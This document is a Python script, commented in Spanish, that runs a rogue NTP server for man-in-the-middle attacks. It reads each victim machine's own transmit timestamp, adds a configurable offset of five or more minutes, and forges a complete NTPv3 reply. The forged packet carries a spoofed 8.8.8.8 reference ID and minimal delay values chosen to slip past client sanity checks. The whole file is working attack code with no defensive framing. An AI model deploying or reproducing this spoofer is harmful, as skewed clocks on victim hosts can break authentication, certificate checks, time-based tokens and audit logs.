import socket
import struct
import time
import sys

# Configuración inicial del Socket UDP (Puerto 123)
PORT = 123
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(('0.0.0.0', PORT))

# El desfase se pasa por argumento (ej: 600 para 10 min), por defecto 300 (5 min)
OFFSET = int(sys.argv[1]) if len(sys.argv) > 1 else 300

def unix_to_ntp_parts(unix_time):
    """Convierte el tiempo Unix a la estructura de 64 bits de NTP (segundos y fracción)"""
    ntp_sec = int(unix_time) + 2208988800
    ntp_frac = int((unix_time - int(unix_time)) * (2**32))
    return ntp_sec, ntp_frac

print(f"[*] Servidor NTP Espejo Iniciado. Desfase configurado: {OFFSET} segundos.")
print("[*] Esperando peticiones de la víctima...")

while True:
    try:
        # Recibir los datos de la víctima
        data, addr = s.recvfrom(1024)

        # Ignorar paquetes basura menores al tamaño mínimo estándar
        if len(data) < 48:
            continue

        # 1. EXTRAER EL TRANSMIT TIMESTAMP DE WINDOWS (Bytes 40 al 47)
        client_tx = data[40:48]

        # 2. DECODIFICAR EL TIEMPO EN FORMATO NTP DE WINDOWS A UNIX
        # Los primeros 4 bytes son los segundos desde 1900, los segundos 4 bytes son la fracción
        client_sec, client_frac = struct.unpack('!II', client_tx)
        
        # Pasar a tiempo Unix decimal para poder sumarle el OFFSET fácilmente
        windows_time_unix = (client_sec - 2208988800) + (client_frac / (2**32))

        # 3. APLICAR EL ENGAÑO EXCLUSIVAMENTE SOBRE LA HORA DE WINDOWS
        # Construimos la línea temporal basándonos en su propia percepción
        fake_transmit_time = windows_time_unix + OFFSET
        fake_receive_time = windows_time_unix + 0.002 # Simula que llegó 2ms antes

        # 4. CONVERTIR LOS NUEVOS TIEMPOS FALSEADOS DE VUELTA A FORMATO NTP
        tx_sec, tx_frac = unix_to_ntp_parts(fake_transmit_time)
        rx_sec, rx_frac = unix_to_ntp_parts(fake_receive_time)
        ref_sec, ref_frac = unix_to_ntp_parts(fake_transmit_time - 60) # Estabilidad simulada

        # 5. CONSTRUIR EL PAQUETE NTP DESDE CERO (48 Bytes estrictos)
        pkt = bytearray(48)

        # Flags estándar de servidor NTPv3
        pkt[0] = 0x1C  
        pkt[1] = 2      # Stratum 2
        pkt[2] = 6      # Polling interval
        pkt[3] = 0xEC   # Precisión (-20)

        # Valores mínimos de retraso y dispersión para evitar filtros de pánico
        struct.pack_into('!I', pkt, 4, 0x00000A00)  # Root Delay
        struct.pack_into('!I', pkt, 8, 0x00000A00)  # Root Dispersion

        # Reference ID (IP ficticia de confianza)
        pkt[12:16] = socket.inet_aton('8.8.8.8')

        # Inyectar las marcas de tiempo en sus posiciones fijas exactas
        struct.pack_into('!II', pkt, 16, ref_sec, ref_frac)   # Reference Timestamp
        pkt[24:32] = client_tx                                 # Originate Timestamp (Copia bit a bit)
        struct.pack_into('!II', pkt, 32, rx_sec, rx_frac)     # Receive Timestamp
        struct.pack_into('!II', pkt, 40, tx_sec, tx_frac)     # Transmit Timestamp

        # 6. ENVIAR RESPUESTA
        s.sendto(bytes(pkt), addr)

        # Consola de depuración basada en el reloj de la víctima
        print(f"\n[+] ¡Petición MitM Procesada!")
        print(f"    - Hora que declaró Windows:  {time.ctime(windows_time_unix)}")
        print(f"    - Hora Falsa Inyectada:      {time.ctime(fake_transmit_time)}")

    except KeyboardInterrupt:
        print("\n[*] Apagando servidor NTP.")
        break
    except Exception as e:
        print(f"[-] Error en el bucle: {e}")